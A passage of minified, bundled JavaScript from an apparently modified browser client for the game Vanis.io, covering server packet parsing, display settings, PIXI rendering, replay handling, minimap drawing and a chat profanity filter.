                            visible: 0 != o.length,
                            text: o
                        }
                    }
                    this.events.$emit("leaderboard-update", t, n)
                }
                parseMinimap(e) {
                    let t = [];
                    for (;;) {
                        let s = e.readUInt16LE();
                        if (0 == s) {
                            this.events.$emit("minimap-positions", t);
                            return
                        }
                        e.offset++;
                        let i = e.readUInt8(),
                            a = e.readUInt8();
                        t.push({
                            pid: s,
                            x: i / 255,
                            y: a / 255
                        })
                    }
                }
                parsePlayers(e) {
                    let t = JSON.parse(e.readEscapedString()),
                        s = t.find(e => e.pid === this.playerId),
                        i = s && this.setTagId(s.tagId),
                        {
                            playerManager: a
                        } = this,
                        n = [];
                    for (let o of t) {
                        let r = a.setPlayerData(o);
                        n.push(r)
                    }
                    i && (this.events.$emit("minimap-positions", []), a.invalidateVisibility(n))
                }
                parseMessage(e) {
                    let t = e.readUInt8();
                    switch (t) {
                        case 1: {
                            let s = d(e);
                            this.initialDataPacket = e.view, this.start(s);
                            return
                        }
                        case 2: {
                            let i = new Uint8Array(e.buffer, 1);
                            this.connection.sendJoinData(new a(i).build(), !1);
                            return
                        }
                        case 3: {
                            let o = performance.now() - this.pingStamp;
                            this.updateStats(Math.round(o));
                            return
                        }
                        case 4: {
                            let {
                                playerManager: r
                            } = this;
                            for (;;) {
                                let l = e.readUInt16LE();
                                if (0 == l) return;
                                r.delayedRemovePlayer(l)
                            }
                        }
                        case 6:
                            this.connection.sendOpcode(6);
                            return;
                        case 7: {
                            let c = e.readUInt8(),
                                h, p;
                            if (1 & c) {
                                let u = e.readUInt16LE();
                                p = this.playerManager.getPlayer(u)
                            }
                            if (2 & c) {
                                let g = e.readUInt16LE();
                                h = this.playerManager.getPlayer(g)
                            }
                            h && h.setCrown(!1), p && p.setCrown(!0);
                            return
                        }
                        case 8:
                            if (this.multiboxPid) return;
                            this.multiboxPid = e.readUInt16LE();
                            return;
                        case 9: {
                            let {
                                playerManager: A
                            } = this, m = this.activePid;
                            m && A.getPlayer(m).setOutline(16777215), m = this.activePid = e.readUInt16LE(), A.getPlayer(m).setOutline(16711935);
                            return
                        }
                        case 10: {
                            this.timeStamp = performance.now();
                            let v = e.packetId || (e.packetId = this.ws.packetCount++);
                            this.parseCells(e, v), this.updateStates(!0);
                            let w = this.alive;
                            w && (this.spectating = !1);
                            let {
                                dual: I
                            } = this, {
                                replay: k
                            } = this;
                            w && !this.replaying ? k.add(e.view, !1) : I.alive || k.clear(!1), !w && y.autoRespawning && 37 == ++this.ticksSinceDeath && this.triggerAutoRespawn(!1), this.serverTick++, this.playerManager.sweepRemovedPlayers(), I.focused || this.updateCamera(!0);
                            return
                        }
                        case 11:
                            this.parseLeaderboard(e);
                            return;
                        case 12:
                            this.parseMinimap(e);
                            return;
                        case 13: {
                            let b = {
                                pid: e.readUInt16LE(),
                                text: e.readEscapedString()
                            };
                            if (0 == b.pid) {
                                let {
                                    selectedServer: _
                                } = y;
                                _ && /Welcome to Vanis\.io,.+\!/.test(b.text) && (b.text = `Connected to ${_.region} ${_.name}`), this.events.$emit("chat-message", b.text);
                                return
                            }
                            let S = this.playerManager.getPlayer(b.pid);
                            if (!S) return;
                            b.from = S.name;
                            let {
                                perk_colorCss: E
                            } = S;
                            E && (b.fromColor = E), this.events.$emit("chat-message", b);
                            return
                        }
                        case 14: {
                            let x = e.readUInt8(),
                                B = {};
                            if (2 & x) {
                                let Q = e.readUInt8();
                                typeId > 0 && typeId < 4 && (B.type = ({
                                    1: "success",
                                    2: "error",
                                    3: "warning",
                                    4: "info"
                                })[Q])
                            }
                            4 & x && (B.timer = e.readUInt16LE());
                            let M = e.readEscapedString();
                            B.title = f(M), n.toast.fire(B);
                            return
                        }
                        case 15: {
                            let {
                                playerManager: T
                            } = this;
                            for (;;) {
                                let D = e.readUInt16LE();
                                if (0 === D) return;
                                let L = e.readString16(),
                                    N = e.readEscapedString(),
                                    U = {
                                        pid: D,
                                        nickname: L,
                                        skinUrl: N
                                    };
                                T.setPlayerData(U)
                            }
                        }
                        case 16:
                            this.parsePlayers(e);
                            return;
                        case 17:
                            C.camera.sx = e.readInt16LE(), C.camera.sy = e.readInt16LE();
                            return;
                        case 18: {
                            let {
                                replay: R
                            } = this;
                            R.clear(!1), this.clearCells();
                            return
                        }
                        case 19: {
                            let P = 0 !== e.readUInt8();
                            if (this.events.$emit("xp-update", e.readUInt32LE()), !P) return;
                            let F = e.readUInt16LE(),
                                G = atob("WW91IGhhdmUgcmVhY2hlZCBsZXZlbA==");
                            n.toast.fire({
                                background: "#b58b00",
                                title: `${G} ${F}!`,
                                type: "success",
                                timer: 4e3
                            });
                            return
                        }
                        case 20:
                            this.handleDeath(e, !1);
                            return;
                        case 21:
                        case 27:
                            return;
                        case 22:
                            if (!window.grecaptcha) return void alert("Captcha library is not loaded");
                            this.events.$emit("show-image-captcha");
                            return;
                        case 23:
                            y.spectators = e.readUInt16LE();
                            return;
                        case 24:
                            this.serverTick = e.readUInt32LE(), this.events.$emit("restart-timing-changed", e.readUInt32LE());
                            return;
                        case 25:
                            this.events.$emit("update-cautions", {
                                custom: e.readEscapedString()
                            });
                            return;
                        case 26:
                            y.playButtonDisabled = !!e.readUInt8(), e.length > e.offset + 1 && (y.playButtonText = e.readEscapedString() || "Play");
                            return;
                        case 28:
                            C.parseScrimmageLeaderboard(e);
                            return
                    }
                }
            }
            e.exports = C = window.GAME = new k
        }, , , function(e) {
            var t = {
                useWebGL: !0,
                antialias:false,
                ultrarender:false,
                gameResolution: 1,
                clearHud:false,
                smallTextThreshold: 40,
                autoZoom: !1,
                rememeberEjecting: !0,
                autoRespawn: !1,
                mouseFreezeSoft: !0,
                drawDelay: 120,
                switchDistance:8,
                cameraMoveDelay: 150,
                cameraZoomDelay: 150,
                cameraZoomSpeed: 10,
                replayDuration: 8,
                showReplaySaved: 2,
                showNames: 2,
                showMass: 2,
                showSkins: 1,
                showOwnName: !0,
                showOwnMass: !0,
                showOwnSkin: !0,
                showCrown: !0,
                foodVisible: !0,
                eatAnimation: !0,
                showHud: !0,
                showLeaderboard: !0,
                showServerName: !1,
                showChat: !0,
                showChatToast: !1,
                minimapEnabled: !0,
                minimapLocations: !0,
                showFPS: !0,
                showPing: !0,
                showCellCount: !0,
                showPlayerScore: !1,
                showPlayerMass: !0,
                showClock: !1,
                showSessionTime: !1,
                showPlayerCount: !1,
                showSpectators: !1,
                showRestartTiming: !1,
                showBlockedMessageCount: !0,
                filterChatMessages: !0,
                clearChatMessages: !0,
                backgroundColor: "101010",
                borderColor: "000000",
                foodColor: "ffffff",
                ejectedColor: "ffa500",
                cellNameOutlineColor: "000000",
                cursorImageUrl: null,
                backgroundImageUrl: "img/background.png",
                virusImageUrl: "img/virus.png",
                cellMassColor: "ffffff",
                cellMassOutlineColor: "000000",
                cellNameFont: "Hind Madurai",
                cellNameWeight: 1,
                cellNameOutline: 2,
                cellNameSmoothOutline: !0,
                cellLongNameThreshold: 750,
                cellMassFont: "Ubuntu",
                cellMassWeight: 2,
                cellMassOutline: 2,
                cellMassTextSize: 0,
                cellMassSmoothOutline: !0,
                shortMass: !0,
                showBackgroundImage: !0,
                backgroundImageRepeat: !0,
                backgroundDefaultIfUnequal: !0,
                backgroundImageOpacity: .6,
                useFoodColor: !1,
                namesEnabled: !0,
                skinsEnabled: !0,
                massEnabled: !0,
                showLocations: !1,
                cellBorderSize: 1,
                autoHideReplayControls: !1,
                minimapSize: 220,
                minimapFPS: 30,
                minimapSmoothing: .08,
                mbColor: "ff3bb7",
                mbSkin: "",
                mbActive: 1,
                mbAutorespawn: !1,
                gameAlpha: 1,
                mbName: "",
                mbUseName: !1,
                debugStats: !1,
                clientStats: !1,
                playerStats: !0,
                showCellLines: !1,
                showTag: !1,
                showDir: !1,
                chatColorOnlyPeople: !1,
                mbArrow: "https://i.postimg.cc/6pvLJ2TW/image.png"
            };

            function s(e) {
                switch (e) {
                    case 2:
                        return "bold";
                    case 0:
                        return "thin";
                    default:
                        return "normal"
                }
            }

            function i(e, t) {
                var s;
                switch (e) {
                    case 3:
                        s = t / 5;
                        break;
                    case 1:
                        s = t / 20;
                        break;
                    default:
                        s = t / 10
                }
                return Math.ceil(s)
            }
            e.exports = window.settings = new class {
                constructor() {
                    this.getInternalSettings(), this.userDefinedSettings = this.loadUserDefinedSettings(), Object.assign(this, t, this.userDefinedSettings), this.set("skinsEnabled", !0), this.set("namesEnabled", !0), this.set("massEnabled", !0), this.compileNameFontStyle(), this.compileMassFontStyle(), this.customSettingsUpdate()
                }
                getInternalSettings() {
                    this.cellSize = 512
                }
                updateClearHUD(){
                    const isClear = this.userDefinedSettings?.clearHud ? 'transparent' : ''
                    document.querySelectorAll('.container')[0].style.background = isClear
                    document.getElementById('chatbox').style.background = isClear
                    document.getElementById('chatbox-input').style.background = isClear
                    document.getElementById('leaderboard').style.background = isClear
                }
                customSettingsUpdate(){
                    this.rendering_scale = this.userDefinedSettings?.ultrarender == true ? 4 : 1
                    this.cellSize = 512*this.rendering_scale
                    this.cellScale = 1/this.rendering_scale
                    PIXI.settings.MIPMAP_TEXTURES = this.userDefinedSettings?.ultrarender ? 2 : 1
                }
                compileNameFontStyle() {
                    var e = {
                        fontFamily: this.cellNameFont,
                        fontSize: 80,
                        fontWeight: s(this.cellNameWeight)
                    };
                    return this.cellNameOutline && (e.stroke = PIXI.utils.string2hex(this.cellNameOutlineColor), e.strokeThickness = i(this.cellNameOutline, e.fontSize), e.lineJoin = this.cellNameSmoothOutline ? "round" : "miter"), this.nameTextStyle = e
                }
                compileMassFontStyle() {
                    var e = {
                        fontFamily: this.cellMassFont,
                        fontSize: 56 + 20 * this.cellMassTextSize,
                        fontWeight: s(this.cellMassWeight),
                        lineJoin: "round",
                        fill: PIXI.utils.string2hex(this.cellMassColor)
                    };
                    return this.cellMassOutline && (e.stroke = PIXI.utils.string2hex(this.cellMassOutlineColor), e.strokeThickness = i(this.cellMassOutline, e.fontSize), e.lineJoin = this.cellMassSmoothOutline ? "round" : "miter"), this.massTextStyle = e
                }
                loadUserDefinedSettings() {
                    if (!localStorage.settings) return {};
                    try {
                        return JSON.parse(localStorage.settings)
                    } catch (e) {
                        return {}
                    }
                }
                getDefault(e) {
                    return t[e]
                }
                set(e, t) {
                    return this[e] !== t && (this[e] = t, this.userDefinedSettings[e] = t, localStorage.settings = JSON.stringify(this.userDefinedSettings), !0)
                }
            }
        }, function(e, t, s) {
            var i = s(270).default,
                a = i.mixin({
                    toast: !0,
                    position: "top",
                    showConfirmButton: !1,
                    showCloseButton: !0
                });
            window.Swal = i, window.SwalAlerts = e.exports = {
                toast: a,
                alert: function(e) {
                    i.fire({
                        text: e,
                        confirmButtonText: "OK"
                    })
                },
                confirm: function(e, t, s) {
                    i.fire({
                        text: e,
                        showCancelButton: !0,
                        confirmButtonText: "Continue"
                    }).then(e => {
                        e.value ? t() : s && s()
                    })
                },
                instance: i
            }
        }, , , function(e, t, s) {
            let i = s(4),
                a = !1;
            e.exports = {
                lerp: (e, t, s) => e + (t - e) * s,
                clampNumber: (e, t, s) => Math.min(s, Math.max(t, e)),
                getTimeString: function(e, t, s) {
                    e instanceof Date && (e = e.getTime());
                    var i = t ? 1 : 1e3,
                        a = 60 * i,
                        n = 60 * a;
                    if (e < i) return "1 second";
                    for (var o = [24 * n, n, a, i], r = ["day", "hour", "minute", "second"], l = !1, c = [], h = 0; h < o.length; h++) {
                        var d = o[h],
                            p = Math.floor(e / d);
                        if (p) {
                            var u = r[h],
                                g = p > 1 ? "s" : "";
                            c.push(p + " " + u + g), e %= d
                        }
                        if (l) break;
                        p && !s && (l = !0)
                    }
                    return c.join(", ")
                },
                encodeHTML: e => e.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/'/g, "&apos;").replace(/"/g, "&quot;"),
                getTimestamp() {
                    let e = new Date,
                        t = e.getFullYear(),
                        s = e.getMonth() + 1,
                        i = e.getDate(),
                        a = [t, (s > 9 ? "" : "0") + s, (i > 9 ? "" : "0") + i].join(""),
                        n = [("0" + e.getHours()).slice(-2), ("0" + e.getMinutes()).slice(-2), ("0" + e.getSeconds()).slice(-2)].join("");
                    return a + "-" + n
                },
                loadImage: e => fetch(e, {
                    mode: "cors"
                }).then(e => e.blob()).then(e => createImageBitmap(e)),
                hideCaptchaBadge() {
                    a || (document.body.classList.add("hide-captcha-badge"), a = !0)
                },
                destroyPixiPlugins(e) {
                    ["interaction", "accessibility"].forEach(t => {
                        let s = e.plugins[t];
                        s && (s.destroy(), delete e.plugins[t])
                    })
                },
                writeUserData(e, t) {
                    let s = t && i.mbUseName ? i.mbName || "Dual" : document.getElementById("nickname").value,
                        a = t ? i.mbSkin || "vanis1" : document.getElementById("skinurl").value,
                        n = document.getElementById("teamtag").value;
                    e.writeEscapedStringNT(s), e.writeEscapedStringNT(a), e.writeEscapedStringNT(n)
                }
            }
        }, , , , function(e, t, s) {
            let i = s(4);
            class a {
                constructor() {
                    this.cache = new Map, this.textureSize = i.cellSize, this.cellSize = this.textureSize / 2
                }
                destroyCache() {
                    let {
                        cache: e
                    } = this;
                    e.forEach(e => e.destroy(!0)), e.clear()
                }
            }
            let n = s(24),
                o = s(124);
            e.exports = {
                cells: new class e extends a {
                    getTexture(e) {
                        let {
                            cache: t
                        } = this;
                        if (t.has(e)) return t.get(e);
                        {
                            let {
                                cellSize: s,
                                textureSize: i
                            } = this, a = new PIXI.Graphics().beginFill(e).drawCircle(0, 0, s).endFill();
                            a.position.set(s);
                          //  a.scale.set(i.cellScale)
                            let o = PIXI.RenderTexture.create(i, i);
                            return t.set(e, o), n.render(a, o), o
                        }
                    }
                },
                squares: new class e extends a {
                    getTexture(e) {
                        let {
                            cache: t
                        } = this;
                        if (t.has(e)) return t.get(e);
                        {
                            let {
                                cellSize: s,
                                textureSize: i
                            } = this, a = new PIXI.Graphics().beginFill(e).drawRect(-s, -s, 2 * s, 2 * s).endFill();
                            a.position.set(s);
                          //  a.scale.set(i.cellScale)
                            let o = PIXI.RenderTexture.create(i, i);
                            return t.set(e, o), n.render(a, o), o
                        }
                    }
                },
                virus: o
            }
        }, , function(e, t, s) {
            let i = s(1),
                a = s(4),
                {
                    cells: n
                } = s(12),
                {
                    clampNumber: o
                } = s(8);
            class r {
                constructor({
                    id: e,
                    x: t,
                    y: s,
                    size: i,
                    flags: a,
                    texture: o,
                    context: r
                }) {
                    o = o || n.getTexture(0), this.flags = a, this.oSize = this.size = i, this.destroyed = !1, this.id = e || 0;
                    let l = this.sprite = new PIXI.Sprite(this.texture = o);
                    l.anchor.set(.5), l.gameData = this, this.x = this.ox = l.position.x = t, this.y = this.oy = this.sprite.position.y = s, this.mainContext = r, this.activeContexts = 1
                }
                update() {
                    let e = i.timeStamp - this.updateStamp,
                        t = o(e / a.drawDelay, 0, 1);
                    if (this.destroyed && (1 === t || this.texture.clearedFromCache)) return !0;
                    let s = 2 * (this.size = t * (this.nSize - this.oSize) + this.oSize),
                        {
                            sprite: n
                        } = this;
                    if (!n) return !0;
                    n.width = n.height = s;
                    let {
                        position: r
                    } = n;
                    return r.x = this.x = t * this.newPositionScale * (this.nx - this.ox) + this.ox, r.y = this.y = t * this.newPositionScale * (this.ny - this.oy) + this.oy, this.onUpdate && this.onUpdate(), !1
                }
                destroy(e, t = !1) {
                    if (this.destroyed) return !1;
                    let {
                        dual: s
                    } = i, {
                        cells: a
                    } = 1 & e ? i : s, {
                        id: n
                    } = this;
                    if (a.delete(n), s.opened) {
                        let o = this.mainContext,
                            r = --this.activeContexts;
                        if (o == e) {
                            let {
                                cells: l
                            } = 2 & e ? i : s;
                            if (l.has(n)) return this.mainContext = 1 & e ? 2 : 1, !1
                        }
                        if (0 != r) return !1
                    }
                    return this.onDestroy && this.onDestroy(), this.pid && i.ownedCells.delete(this), this.destroyed = !0, t ? i.destroyedCells.push(this) : this.destroySprite(), !0
                }
                destroySprite() {
                    this.sprite && (this.sprite.destroy(), this.sprite = null)
                }
            }
            r.prototype.type = 0, r.prototype.updateStamp = 0, r.prototype.newPositionScale = 1, e.exports = r
        }, , , function(e, t, s) {
            var i = s(5);

            function a() {
                i.instance.fire({
                    type: "warning",
                    title: "Browser support limited",
                    html: "Skins might not work properly in this browser.<br>Please consider using Chrome.",
                    allowOutsideClick: !1
                })
            }

            function n(e) {
                for (var t = "", s = 0; s < e.length; s++) t += String.fromCharCode(e.charCodeAt(s) - 2);
                return t
            }
            var o = ["pkiigt", "p3iigt", "pkii5t", "pkiic", "p3iic", "p3ii6", "pkii", "p3ii", "p3i", "hciiqv", "h6iiqv", "hcii2v", "hci", "cpcn", "cuujqng", "ewpv", "rwuu{", "xcikpc", "xci3pc", "eqem", "e2em", "uewo", "ycpm", "yjqtg", "yj2tg", "unwv", "dkvej", "d3vej", "rqtp", "r2tp", "tcrg", "t6rg", "jkvngt", "j3vngt", "jkvn5t", "j3vn5t", "pc|k", "p6|k", "tgvctf", "ejkpm", "hwem", "ujkv"],
                r = o.map(n),
                l = o.map(n).sort((e, t) => t.length - e.length).map(e => RegExp("[^s]*" + e.split("").join("s*") + "[^s]*", "gi"));
            e.exports = {
                noop: function() {},
                checkBadWords: function(e) {
                    return e = e.toLowerCase(), r.some(t => e.includes(t))
                },
                replaceBadWordsChat: function(e) {
                    for (var t = 0; t < l.length; t++) e = e.replace(l[t], e => Array(e.length).fill("*").join(""));
                    return e
                },
                notifyUnsupportedBrowser: async function() {
                    window.safari || /^((?!chrome|android).)*safari/i.test(navigator.userAgent) ? i.instance.fire({
                        type: "warning",
                        title: "Safari browser is not supported :(",
                        html: "Please consider using Google Chrome.",
                        allowOutsideClick: !1,
                        showCloseButton: !1,
                        showCancelButton: !1,
                        showConfirmButton: !1
                    }) : !localStorage.skipUnsupportedAlert && ((localStorage.skipUnsupportedAlert = !0, navigator.userAgent.toLowerCase().includes("edge")) ? a() : await new Promise(e => {
                        var t = new Image;
                        t.src = "data:image/webp;base64,UklGRjoAAABXRUJQVlA4IC4AAACyAgCdASoCAAIALmk0mk0iIiIiIgBoSygABc6WWgAA/veff/0PP8bA//LwYAAA", t.onload = t.onerror = () => {
                            e(2 === t.height)
                        }
                    }) || a())
                },
                isFirstVisit: !localStorage.visitedBefore && (localStorage.visitedBefore = !0, !0)
            }
        }, , , , , , , function(e, t, s) {
            var i = s(4),
                a = s(8);
            PIXI.utils.skipHello();
            var n = document.getElementById("canvas"),
                o = {
                    resolution: i.customResolution || window.devicePixelRatio || 1,
                    view: n,
                    forceCanvas: !i.useWebGL,
                    autoDensity:true,
                    antialias: i.antialias,
                    powerPreference: "high-performance",
                    backgroundColor: PIXI.utils.string2hex(i.backgroundColor)
                };
            o.resolution = i.ultrarender ? 2.5 : i.gameResolution;
            var r = PIXI.autoDetectRenderer(o);

            function l() {
                r.resize(window.innerWidth, window.innerHeight)
            }
            l(), a.destroyPixiPlugins(r), window.addEventListener("resize", l), r.clear(), e.exports = r
        }, function(e) {
            function t() {
                this.data = []
            }
            e.exports = t, t.prototype.write = function() {
                return new Uint8Array(this.data)
            }, t.prototype.uint8 = function(e) {
                this.data.push(e)
            }, t.prototype.uint8Array = function(e) {
                for (var t = 0; t < e.length; t++) this.data.push(e[t])
            }, t.prototype.utf8 = function(e) {
                e = unescape(encodeURIComponent(e));
                for (var t = 0; t < e.length; t++) this.data.push(e.charCodeAt(t));
                this.data.push(0)
            }
        }, , , , function(e, t, s) {
            var i = s(2),
                a = s(167);
            "string" == typeof(a = a.__esModule ? a.default : a) && (a = [
                [e.i, a, ""]
            ]);
            var n = (i(a, {
                insert: "head",
                singleton: !1
            }), a.locals ? a.locals : {});
            e.exports = n
        }, function(e, t, s) {
            "use strict";
            var i = s(31),
                a = s.n(i);
            t.default = a.a
        }, function(e) {
            e.exports = {
                data: () => ({})
            }
        }, function(e, t, s) {
            var i = s(2),
                a = s(169);
            "string" == typeof(a = a.__esModule ? a.default : a) && (a = [
                [e.i, a, ""]
            ]);
            var n = (i(a, {
                insert: "head",
                singleton: !1
            }), a.locals ? a.locals : {});
            e.exports = n
        }, function(e, t, s) {
            var i = s(2),
                a = s(171);
            "string" == typeof(a = a.__esModule ? a.default : a) && (a = [
                [e.i, a, ""]
            ]);
            var n = (i(a, {
                insert: "head",
                singleton: !1
            }), a.locals ? a.locals : {});
            e.exports = n
        }, function(e, t, s) {
            var i = s(2),
                a = s(173);
            "string" == typeof(a = a.__esModule ? a.default : a) && (a = [
                [e.i, a, ""]
            ]);
            var n = (i(a, {
                insert: "head",
                singleton: !1
            }), a.locals ? a.locals : {});
            e.exports = n
        }, function(e, t, s) {
            var i = s(2),
                a = s(175);
            "string" == typeof(a = a.__esModule ? a.default : a) && (a = [
                [e.i, a, ""]
            ]);
            var n = (i(a, {
                insert: "head",
                singleton: !1
            }), a.locals ? a.locals : {});
            e.exports = n
        }, function(e, t, s) {
            var i = s(2),
                a = s(177);
            "string" == typeof(a = a.__esModule ? a.default : a) && (a = [
                [e.i, a, ""]
            ]);
            var n = (i(a, {
                insert: "head",
                singleton: !1
            }), a.locals ? a.locals : {});
            e.exports = n
        }, function(e, t, s) {
            var i = s(2),
                a = s(179);
            "string" == typeof(a = a.__esModule ? a.default : a) && (a = [
                [e.i, a, ""]
            ]);
            var n = (i(a, {
                insert: "head",
                singleton: !1
            }), a.locals ? a.locals : {});
            e.exports = n
        }, function(e, t, s) {
            "use strict";
            var i = s(39),
                a = s.n(i);
            t.default = a.a
        }, function(e, t, s) {
            var i = s(89),
                a = s(1),
                n = s(5),
                o = a.replay.database;
            e.exports = {
                props: ["replay"],
                methods: {
                    async play(e) {
                        if (!a.connection.opened || await new Promise(e => {
                                n.confirm("You will be disconnected", () => e(!0), () => e(!1))
                            })) try {
                            a.replay.play(e)
                        } catch (t) {
                            console.log(t), a.stop(), n.alert("Waching replays on extension currently does not work, please watch them without extension or render them!")
                        }
                    },
                    downloadReplay(e) {
                        n.instance.fire({
                            input: "text",
                            inputValue: e.name,
                            showCancelButton: !0,
                            confirmButtonText: "Download",
                            html: "Only Vanis.io can read replay files.<br>It consists of player positions and other game related data."
                        }).then(t => {
                            var s = t.value;
                            if (s) {
                                var a = new Blob([e.data], {
                                    type: "text/plain;charset=utf-8"
                                });
                                i.saveAs(a, s + ".vanis")
                            }
                        })
                    },
                    deleteReplay(e) {
                        n.confirm("Are you sure that you want to delete this replay?", () => {
                            o.removeItem(e, () => {
                                a.events.$emit("replay-removed")
                            })
                        })
                    }
                }
            }
        }, function(e, t, s) {
            var i = s(2),
                a = s(219);
            "string" == typeof(a = a.__esModule ? a.default : a) && (a = [
                [e.i, a, ""]
            ]);
            var n = (i(a, {
                insert: "head",
                singleton: !1
            }), a.locals ? a.locals : {});
            e.exports = n
        }, function(e, t, s) {
            var i = s(2),
                a = s(221);
            "string" == typeof(a = a.__esModule ? a.default : a) && (a = [
                [e.i, a, ""]
            ]);
            var n = (i(a, {
                insert: "head",
                singleton: !1
            }), a.locals ? a.locals : {});
            e.exports = n
        }, function(e, t, s) {
            var i = s(2),
                a = s(223);
            "string" == typeof(a = a.__esModule ? a.default : a) && (a = [
                [e.i, a, ""]
            ]);
            var n = (i(a, {
                insert: "head",
                singleton: !1
            }), a.locals ? a.locals : {});
            e.exports = n
        }, function(e, t, s) {
            var i = s(2),
                a = s(225);
            "string" == typeof(a = a.__esModule ? a.default : a) && (a = [
                [e.i, a, ""]
            ]);
            var n = (i(a, {
                insert: "head",
                singleton: !1
            }), a.locals ? a.locals : {});
            e.exports = n
        }, function(e, t, s) {
            var i = s(2),
                a = s(227);
            "string" == typeof(a = a.__esModule ? a.default : a) && (a = [
                [e.i, a, ""]
            ]);
            var n = (i(a, {
                insert: "head",
                singleton: !1
            }), a.locals ? a.locals : {});
            e.exports = n
        }, function(e, t, s) {
            var i = s(2),
                a = s(231);
            "string" == typeof(a = a.__esModule ? a.default : a) && (a = [
                [e.i, a, ""]
            ]);
            var n = (i(a, {
                insert: "head",
                singleton: !1
            }), a.locals ? a.locals : {});
            e.exports = n
        }, function(e, t, s) {
            var i = s(2),
                a = s(233);
            "string" == typeof(a = a.__esModule ? a.default : a) && (a = [
                [e.i, a, ""]
            ]);
            var n = (i(a, {
                insert: "head",
                singleton: !1
            }), a.locals ? a.locals : {});
            e.exports = n
        }, function(e, t, s) {
            var i = s(2),
                a = s(235);
            "string" == typeof(a = a.__esModule ? a.default : a) && (a = [
                [e.i, a, ""]
            ]);
            var n = (i(a, {
                insert: "head",
                singleton: !1
            }), a.locals ? a.locals : {});
            e.exports = n
        }, function(e, t, s) {
            var i = s(2),
                a = s(237);
            "string" == typeof(a = a.__esModule ? a.default : a) && (a = [
                [e.i, a, ""]
            ]);
            var n = (i(a, {
                insert: "head",
                singleton: !1
            }), a.locals ? a.locals : {});
            e.exports = n
        }, function(e, t, s) {
            var i = s(2),
                a = s(239);
            "string" == typeof(a = a.__esModule ? a.default : a) && (a = [
                [e.i, a, ""]
            ]);
            var n = (i(a, {
                insert: "head",
                singleton: !1
            }), a.locals ? a.locals : {});
            e.exports = n
        }, function(e, t, s) {
            var i = s(2),
                a = s(241);
            "string" == typeof(a = a.__esModule ? a.default : a) && (a = [
                [e.i, a, ""]
            ]);
            var n = (i(a, {
                insert: "head",
                singleton: !1
            }), a.locals ? a.locals : {});
            e.exports = n
        }, function(e, t, s) {
            var i = s(2),
                a = s(243);
            "string" == typeof(a = a.__esModule ? a.default : a) && (a = [
                [e.i, a, ""]
            ]);
            var n = (i(a, {
                insert: "head",
                singleton: !1
            }), a.locals ? a.locals : {});
            e.exports = n
        }, function(e, t, s) {
            var i = s(2),
                a = s(245);
            "string" == typeof(a = a.__esModule ? a.default : a) && (a = [
                [e.i, a, ""]
            ]);
            var n = (i(a, {
                insert: "head",
                singleton: !1
            }), a.locals ? a.locals : {});
            e.exports = n
        }, function(e, t, s) {
            var i = s(2),
                a = s(247);
            "string" == typeof(a = a.__esModule ? a.default : a) && (a = [
                [e.i, a, ""]
            ]);
            var n = (i(a, {
                insert: "head",
                singleton: !1
            }), a.locals ? a.locals : {});
            e.exports = n
        }, function(e, t, s) {
            var i = s(2),
                a = s(249);
            "string" == typeof(a = a.__esModule ? a.default : a) && (a = [
                [e.i, a, ""]
            ]);
            var n = (i(a, {
                insert: "head",
                singleton: !1
            }), a.locals ? a.locals : {});
            e.exports = n
        }, function(e, t, s) {
            "use strict";
            var i = s(56),
                a = s.n(i);
            t.default = a.a
        }, function(e, t, s) {
            var i = s(1),
                a = s(8),
                n = s(4),
                o = n.minimapSize,
                r = n.minimapFPS,
                l = n.minimapSmoothing,
                c = new PIXI.Container,
                h = {};

            function d() {
                return (new Date).toLocaleTimeString()
            }

            function p(e, t = !1) {
                if (t && e < 1) return "instant";
                e = Math.floor(e);
                let s = Math.floor(e / 60),
                    i = Math.floor(s / 60);
                return s < 1 ? t ? e + "s" : "<1min" : i < 1 ? s + "min" : s % 60 == 0 ? i + "hr" : i + "hr " + s % 60 + "min"
            }
            e.exports = {
                data: () => ({
                    showMinimap: !1,
                    showMinimapCircle: !1,
                    showMinimapStats: !0,
                    showLocations: n.minimapLocations,
                    interval: null,
                    minimapStatsBottom: 10,
                    showClock: n.showClock,
                    showSessionTime: n.showSessionTime,
                    showSpectators: n.showSpectators,
                    showPlayerCount: n.showPlayerCount,
                    showRestartTiming: n.showRestartTiming,
                    systemTime: d(),
                    sessionTime: p(0, !1),
                    restartTime: p(0, !0),
                    spectators: 0,
                    playerCount: 0,
                    restartTick: 0,
                    startTime: null,
                    gameState: i.state
                }),
                computed: {
                    playerCountDisplayed() {
                        if (this.gameState.selectedServer) {
                            var e = this.gameState.selectedServer.slots;
                            return Math.min(this.playerCount, e) + " / " + e + " players"
                        }
                        return this.playerCount + " player" + (1 === this.playerCount ? "" : "s")
                    }
                },
                methods: {
                    initRenderer(e) {
                        var t = PIXI.autoDetectRenderer({
                            resolution: 1,
                            view: e,
                            width: o,
                            height: o,
                            forceCanvas: !n.useWebGL,
                            antialias: i.antialias,
                            powerPreference: "high-performance",
                            transparent: !0
                        });
                        a.destroyPixiPlugins(t), t.clear(), this.renderer = t
                    },
                    destroyMinimap() {
                        c.destroy(!0), c = new PIXI.Container, this.renderer.clear()
                    },
                    onMinimapShow() {
                        this.interval || (this.showMinimap = !0, this.minimapStatsBottom = o + 10, i.events.$on("minimap-positions", this.updatePositions), this.interval = setInterval(this.render, 1e3 / r))
                    },
                    onMinimapHide() {
                        this.interval && (this.showMinimap = !1, this.minimapStatsBottom = 10, i.events.$off("minimap-positions", this.updatePositions), clearInterval(this.interval), this.interval = null, this.spectators = 0, this.playerCount = 0)
                    },
                    createNode(e, t, s, i) {
                        e in h && h[e].destroy(!0), s = s || 16777215, i = i || 16777215;
                        let a = new PIXI.Container;
                        a.newPosition = {};
                        let n = new PIXI.Graphics().beginFill(i).drawCircle(0, 0, 5).endFill();
                        if (a.addChild(n), t) {
                            let o = new PIXI.Text(t, {
                                strokeThickness: 4,
                                lineJoin: "round",
                                fontFamily: "Nunito",
                                fill: s,
                                fontSize: 12
                            });
                            o.anchor.set(.5), o.pivot.y = 15, a.addChild(o)
                        }
                        h[e] = a
                    },
                    destroyNode(e) {
                        var t = h[e];
                        t && (t.destroy(!0), delete h[e])
                    },
                    updatePositions(e) {
                        c.removeChildren();
                        for (var t = 0; t < e.length; t++) {
                            var s = e[t],
                                i = h[s.pid];
                            i && (i.newPosition.x = s.x * o, i.newPosition.y = s.y * o, c.addChild(i))
                        }
                        this.render()
                    },
                    render() {
                        for (var e = c.children, t = l * (30 / r), s = 0; s < e.length; s++) {
                            var i = e[s];
                            i.position.x = a.lerp(i.position.x, i.newPosition.x, t), i.position.y = a.lerp(i.position.y, i.newPosition.y, t)
                        }
                        this.renderer.render(c)
